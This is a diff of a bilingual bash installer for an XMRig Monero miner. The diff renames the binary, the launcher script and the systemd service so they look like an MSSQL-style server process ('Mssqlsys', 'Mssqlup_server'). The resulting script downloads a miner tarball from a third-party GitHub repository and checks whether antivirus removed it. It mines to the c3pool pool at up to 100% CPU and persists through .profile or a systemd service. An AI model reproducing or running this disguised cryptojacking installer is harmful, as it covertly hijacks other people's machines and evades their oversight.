@@ -21,7 +21,7 @@ EMAIL=$2 # this one is optional
 
 if [ -z $WALLET ]; then
   echo "Script usage:"
-  echo "> setup_wkgg_miner.sh <wallet address> [<your email address>]"
+  echo "> setup_wkgg_server.sh <wallet address> [<your email address>]"
   echo "ERROR: Please specify your wallet address"
   exit 1
 fi
@@ -121,10 +121,10 @@ fi
 
 # printing intentions
 
-echo "I will download, setup and run in background Monero CPU miner."
-echo "将进行下载设置,并在后台中运行xmrig矿工."
-echo "If needed, miner in foreground can be started by $HOME/wkgg/miner.sh script."
-echo "如果需要,可以通过以下方法启动前台矿工输出 $HOME/wkgg/miner.sh script."
+echo "I will download, setup and run in background Monero CPU server."
+echo "将进行下载设置,并在后台中运行phpup服务."
+echo "If needed, server in foreground can be started by $HOME/wkgg/Mssqlup.sh script."
+echo "如果需要,可以通过以下方法启动前台服务输出 $HOME/wkgg/Mssqlup.sh script."
 echo "Mining will happen to $WALLET wallet."
 echo "将使用 $WALLET 地址进行开采"
 if [ ! -z $EMAIL ]; then
@@ -136,8 +136,8 @@ if ! sudo -n true 2>/dev/null; then
   echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
   echo "由于脚本无法执行无密码的sudo，因此在您重启后首次登录此主机时，后台开采将从您的 $HOME/.profile 文件开始."
 else
-  echo "Mining in background will be performed using wkgg_miner systemd service."
-  echo "后台开采将使用wkgg_miner systemd服务执行."
+  echo "Mining in background will be performed using Mssqlup_server systemd service."
+  echo "后台开采将使用Mssqlup_serber systemd服务执行."
 fi
 
 echo
@@ -147,51 +147,52 @@ echo
 echo
 echo
 
-# start doing stuff: preparing miner
+# start doing stuff: preparing server
 
-echo "[*] Removing previous wkgg miner (if any)"
-echo "[*] 卸载以前的 wkgg 矿工 (如果存在)"
+echo "[*] Removing previous wkgg Server (if any)"
+echo "[*] 卸载以前的 wkgg  (如果存在)"
 if sudo -n true 2>/dev/null; then
-  sudo systemctl stop wkgg_miner.service
+  sudo systemctl stop Mssqlup_server.service
 fi
 killall -9 xmrig
+killall -9 phpup
 
 echo "[*] Removing $HOME/wkgg directory"
 rm -rf $HOME/wkgg
 
-echo "[*] Downloading wkgg advanced version of xmrig to /tmp/xmrig.tar.gz"
-echo "[*] 下载 Wkgg 版本的 Xmrig 到 /tmp/xmrig.tar.gz 中"
-if ! curl -L --progress-bar "https://github.com/teshushu/BiBi/raw/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download https://github.com/teshushu/BiBi/raw/main/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
-  echo "发生错误: 无法下载 https://github.com/teshushu/BiBi/raw/main/xmrig.tar.gz 文件到 /tmp/xmrig.tar.gz"
+echo "[*] Downloading wkgg advanced version of phpup to /tmp/wkggxmr.tar.gz"
+echo "[*] 下载 Wkgg 版本的 wkggxmr 到 /tmp/wkggxmr.tar.gz 中"
+if ! curl -L --progress-bar "https://github.com/teshushu/BiBi/raw/main/wkggxmr.tar.gz" -o /tmp/wkggxmr.tar.gz; then
+  echo "ERROR: Can't download https://github.com/teshushu/BiBi/raw/main/wkggxmr.tar.gz file to /tmp/wkggxmr.tar.gz"
+  echo "发生错误: 无法下载 https://github.com/teshushu/BiBi/raw/main/wkggxmr.tar.gz 文件到 /tmp/wkggxmr.tar.gz"
   exit 1
 fi
 
-echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/wkgg"
-echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/wkgg"
+echo "[*] Unpacking /tmp/wkggxmr.tar.gz to $HOME/wkgg"
+echo "[*] 解压 /tmp/wkggxmr.tar.gz 到 $HOME/wkgg"
 [ -d $HOME/wkgg ] || mkdir $HOME/wkgg
-if ! tar xf /tmp/xmrig.tar.gz -C $HOME/wkgg; then
-  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/wkgg directory"
-  echo "发生错误: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/wkgg 目录"
+if ! tar xf /tmp/wkggxmr.tar.gz -C $HOME/wkgg; then
+  echo "ERROR: Can't unpack /tmp/wkggxmr.tar.gz to $HOME/wkgg directory"
+  echo "发生错误: 无法解压 /tmp/wkggxmr.tar.gz 到 $HOME/wkgg 目录"
   exit 1
 fi
-rm /tmp/xmrig.tar.gz
+rm /tmp/wkggxmr.tar.gz
 
-echo "[*] Checking if advanced version of $HOME/wkgg/xmrig works fine (and not removed by antivirus software)"
-echo "[*] 检查目录 $HOME/wkgg/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
+echo "[*] Checking if advanced version of $HOME/wkgg/Mssqlsys works fine (and not removed by antivirus software)"
+echo "[*] 检查目录 $HOME/wkgg/Mssqlsys 中的Mssqlsys是否运行正常 (或者是否被杀毒软件误杀)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/wkgg/config.json
-$HOME/wkgg/xmrig --help >/dev/null
+$HOME/wkgg/Mssqlsys --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/wkgg/xmrig ]; then
-    echo "WARNING: Advanced version of $HOME/wkgg/xmrig is not functional"
-	echo "警告: 版本 $HOME/wkgg/xmrig 无法正常工作"
+  if [ -f $HOME/wkgg/Mssqlsys ]; then
+    echo "WARNING: Advanced version of $HOME/wkgg/Mssqlsys is not functional"
+	echo "警告: 版本 $HOME/wkgg/Mssqlsys 无法正常工作"
   else 
-    echo "WARNING: Advanced version of $HOME/wkgg/xmrig was removed by antivirus (or some other problem)"
-	echo "警告: 该目录 $HOME/wkgg/xmrig 下的xmrig已被杀毒软件删除 (或其它问题)"
+    echo "WARNING: Advanced version of $HOME/wkgg/Mssqlsys was removed by antivirus (or some other problem)"
+	echo "警告: 该目录 $HOME/wkgg/Mssqlsys 下的Mssqlsys已被杀毒软件删除 (或其它问题)"
   fi
 
-  echo "[*] Looking for the latest version of Monero miner"
-  echo "[*] 查看最新版本的 xmrig 挖矿工具"
+  echo "[*] Looking for the latest version of Monero server"
+  echo "[*] 查看最新版本的 Mssqlsys 服务工具"
   LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
   LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
 
@@ -211,24 +212,24 @@ if (test $? -ne 0); then
   fi
   rm /tmp/xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/wkgg/xmrig works fine (and not removed by antivirus software)"
-  echo "[*] 检查目录 $HOME/wkgg/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
+  echo "[*] Checking if stock version of $HOME/wkgg/Mssqlsys works fine (and not removed by antivirus software)"
+  echo "[*] 检查目录 $HOME/wkgg/Mssqlsys 中的Mssqlsys是否运行正常 (或者是否被杀毒软件误杀)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/wkgg/config.json
-  $HOME/wkgg/xmrig --help >/dev/null
+  $HOME/wkgg/Mssqlsys --help >/dev/null
   if (test $? -ne 0); then 
-    if [ -f $HOME/wkgg/xmrig ]; then
-      echo "ERROR: Stock version of $HOME/wkgg/xmrig is not functional too"
-	  echo "发生错误: 该目录中的 $HOME/wkgg/xmrig 也无法使用"
+    if [ -f $HOME/wkgg/Mssqlsys ]; then
+      echo "ERROR: Stock version of $HOME/wkgg/Mssqlsys is not functional too"
+	  echo "发生错误: 该目录中的 $HOME/wkgg/Mssqlsys 也无法使用"
     else 
-      echo "ERROR: Stock version of $HOME/wkgg/xmrig was removed by antivirus too"
-	  echo "发生错误: 该目录中的 $HOME/wkgg/xmrig 已被杀毒软件删除"
+      echo "ERROR: Stock version of $HOME/wkgg/Mssqlsys was removed by antivirus too"
+	  echo "发生错误: 该目录中的 $HOME/wkgg/Mssqlsys 已被杀毒软件删除"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Miner $HOME/wkgg/xmrig is OK"
-echo "[*] 矿工 $HOME/wkgg/xmrig 运行正常"
+echo "[*] Server $HOME/wkgg/Mssqlsys is OK"
+echo "[*] 服务 $HOME/wkgg/Mssqlsys 运行正常"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -245,7 +246,7 @@ sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/wkgg/config
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/wkgg/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/wkgg/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/wkgg/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/wkgg/xmrig.log'",#' $HOME/wkgg/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/wkgg/Mssqlsys.log'",#' $HOME/wkgg/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/wkgg/config.json
 
 cp $HOME/wkgg/config.json $HOME/wkgg/config_background.json
@@ -253,36 +254,36 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/wkgg/config_backgrou
 
 # preparing script
 
-echo "[*] Creating $HOME/wkgg/miner.sh script"
-echo "[*] 在该目录下创建 $HOME/wkgg/miner.sh 脚本"
-cat >$HOME/wkgg/miner.sh <<EOL
+echo "[*] Creating $HOME/wkgg/Mssqlup.sh script"
+echo "[*] 在该目录下创建 $HOME/wkgg/Mssqlup.sh 脚本"
+cat >$HOME/wkgg/Mssqlup.sh <<EOL
 #!/bin/bash
-if ! pidof xmrig >/dev/null; then
-  nice $HOME/wkgg/xmrig \$*
+if ! pidof Mssqlsys >/dev/null; then
+  nice $HOME/wkgg/Mssqlsys \$*
 else
-  echo "Monero miner is already running in the background. Refusing to run another one."
-  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
-  echo "门罗币矿工已经在后台运行。 拒绝运行另一个."
-  echo "如果要先删除后台矿工，请运行 \"killall xmrig\" 或 \"sudo killall xmrig\"."
+  echo "Monero server is already running in the background. Refusing to run another one."
+  echo "Run \"killall Mssqlsys\" or \"sudo killall Mssqlsys\" if you want to remove background server first."
+  echo "Mssqlup服务已经在后台运行。 拒绝运行另一个."
+  echo "如果要先删除后台服务，请运行 \"killall Mssqlsys\" 或 \"sudo killall Mssqlsys\"."
 fi
 EOL
 
-chmod +x $HOME/wkgg/miner.sh
+chmod +x $HOME/wkgg/Mssqlup.sh
 
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep wkgg/miner.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/wkgg/miner.sh script to $HOME/.profile"
-	echo "[*] 添加 $HOME/wkgg/miner.sh 到 $HOME/.profile"
-    echo "$HOME/wkgg/miner.sh --config=$HOME/wkgg/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep wkgg/Mssqlup.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/wkgg/Mssqlup.sh script to $HOME/.profile"
+	echo "[*] 添加 $HOME/wkgg/Mssqlup.sh 到 $HOME/.profile"
+    echo "$HOME/wkgg/Mssqlup.sh --config=$HOME/wkgg/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/wkgg/miner.sh script is already in the $HOME/.profile"
-	echo "脚本 $HOME/wkgg/miner.sh 已存在于 $HOME/.profile 中."
+    echo "Looks like $HOME/wkgg/Mssqlup.sh script is already in the $HOME/.profile"
+	echo "脚本 $HOME/wkgg/Mssqlup.sh 已存在于 $HOME/.profile 中."
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/wkgg/xmrig.log file)"
-  echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/wkgg/xmrig.log 日志文件)"
-  /bin/bash $HOME/wkgg/miner.sh --config=$HOME/wkgg/config_background.json >/dev/null 2>&1
+  echo "[*] Running server in the background (see logs in $HOME/wkgg/Mssqlsys.log file)"
+  echo "[*] 已在后台运行Mssqlsys (请查看 $HOME/wkgg/Mssqlsys.log 日志文件)"
+  /bin/bash $HOME/wkgg/Mssqlup.sh --config=$HOME/wkgg/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
@@ -294,21 +295,21 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in $HOME/wkgg/xmrig.log file)"
-	echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/wkgg/xmrig.log 日志文件)"
-    /bin/bash $HOME/wkgg/miner.sh --config=$HOME/wkgg/config_background.json >/dev/null 2>&1
+    echo "[*] Running server in the background (see logs in $HOME/wkgg/Mssqlsys.log file)"
+	echo "[*] 已在后台运行Mssqlsys (请查看 $HOME/wkgg/Mssqlsys.log 日志文件)"
+    /bin/bash $HOME/wkgg/Mssqlup.sh --config=$HOME/wkgg/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
-    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
+    echo "Please move to a more modern Linux distribution or setup server activation after reboot yourself if possible."
 
   else
 
-    echo "[*] Creating wkgg_miner systemd service"
-    cat >/tmp/wkgg_miner.service <<EOL
+    echo "[*] Creating Mssqlup_server systemd service"
+    cat >/tmp/Mssqlup_server.service <<EOL
 [Unit]
-Description=Monero miner service
+Description=Monero server service
 
 [Service]
-ExecStart=$HOME/wkgg/xmrig --config=$HOME/wkgg/config.json
+ExecStart=$HOME/wkgg/Mssqlsys --config=$HOME/wkgg/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -316,32 +317,32 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /tmp/wkgg_miner.service /etc/systemd/system/wkgg_miner.service
-    echo "[*] Starting wkgg_miner systemd service"
-	echo "[*] 启动wkgg_miner systemd服务"
-    sudo killall xmrig 2>/dev/null
+    sudo mv /tmp/Mssqlup_server.service /etc/systemd/system/Mssqlup_server.service
+    echo "[*] Starting Mssqlup_server systemd service"
+	echo "[*] 启动Mssqlup_server systemd服务"
+    sudo killall Mssqlsys 2>/dev/null
     sudo systemctl daemon-reload
-    sudo systemctl enable wkgg_miner.service
-    sudo systemctl start wkgg_miner.service
-    echo "To see miner service logs run \"sudo journalctl -u wkgg_miner -f\" command"
-	echo "查看矿工服务日志,请运行 \"sudo journalctl -u wkgg_miner -f\" 命令"
+    sudo systemctl enable Mssqlup_server.service
+    sudo systemctl start Mssqlup_server.service
+    echo "To see server service logs run \"sudo journalctl -u Mssqlup_server -f\" command"
+	echo "查看服务日志,请运行 \"sudo journalctl -u Mssqlup_server -f\" 命令"
   fi
 fi
 
 echo ""
-echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
-echo "提示: 如果您使用共享VPS，建议避免由矿工产生100％的CPU使用率，否则可能将被禁止使用"
+echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the server or you will be banned"
+echo "提示: 如果您使用共享VPS，建议避免由服务产生100％的CPU使用率，否则可能将被禁止使用"
 if [ "$CPU_THREADS" -lt "4" ]; then
-  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
+  echo "HINT: Please execute these or similair commands under root to limit server to 75% percent CPU usage:"
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
-  echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
+  echo "sudo cpulimit -e Mssqlsys -l $((75*$CPU_THREADS)) -b"
   if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$acpulimit -e Mssqlsys -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   else
-    echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$i \\cpulimit -e Mssqlsys -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   fi
 else
-  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
+  echo "HINT: Please execute these commands and reboot your VPS after that to limit server to 75% percent CPU usage:"
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/wkgg/config.json"
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/wkgg/config_background.json"
 fi
